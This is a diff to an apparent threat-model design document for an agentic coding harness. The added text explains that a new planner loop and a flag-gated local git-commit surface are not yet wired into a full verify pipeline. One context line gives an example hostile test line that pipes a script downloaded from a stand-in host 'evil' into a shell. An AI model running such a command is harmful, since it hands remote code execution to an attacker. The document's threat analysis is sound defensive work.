@@ -185,6 +185,34 @@ narrower and more precise reason than "nothing executes":
   not an arbitrary command the patch gets to choose). This is a materially
   different threat than "run whatever an anonymous multi-tenant user uploads,"
   which is the threat gVisor/Firecracker actually target.
+
+  **[Second amendment, added alongside the loop driver and git-write surface.]**
+  Two of the three pieces that sentence called "future phase" now exist, each
+  independently, and neither changes the conclusion above:
+
+  - **A model-driven planner loop** (`agentic/harness_optimizer/loop_driver.py`)
+    runs a plan → patch → verify → review cycle, but "verify" there means the
+    existing deterministic train/holdout case checks and governance inspection
+    `GitHubCodingRunner.evaluate()` already performed pre-amendment — it never
+    calls `run_verification`, and it only ever overlays a candidate onto the
+    committed 4-file fixture repository copied into a tempdir, never a real
+    clone. It cannot produce a worktree for the executor to run against.
+  - **A local git-write surface** (`agentic.deepagent_github.repo_workspace.
+    RepoWorkspaceTools.checkout_branch`/`add`/`commit`/`diff`) can now commit
+    inside the jailed clone `RepoWorkspaceTools.clone()` populates — still
+    local only (no `push`, no GitHub API call), gated on its own
+    default-`False` `deepagent_github.allow_git_write_tools` flag, and with
+    the committer identity always forced to this project's own convention
+    (never the operator's).
+
+  Neither module calls the other, and neither calls `run_verification`. The
+  loop driver never sees a real repository; the git-write surface never runs a
+  test or a linter. So the residual risk section above still describes the
+  honest state precisely: a real "planner proposes a diff against a real clone,
+  it gets committed, and the executor verifies that commit" pipeline does not
+  exist yet — three independently-shipped, independently-tested, independently
+  gated pieces do, each smaller than the pipeline the first amendment
+  described, and none of them wired to either of the others.
 - **The residual risk this changes is real and is named, not hidden.** A
   hostile test file (e.g. one line reading `os.system("curl evil/x|sh")`)
   genuinely can attempt to run arbitrary code within the executor subprocess's
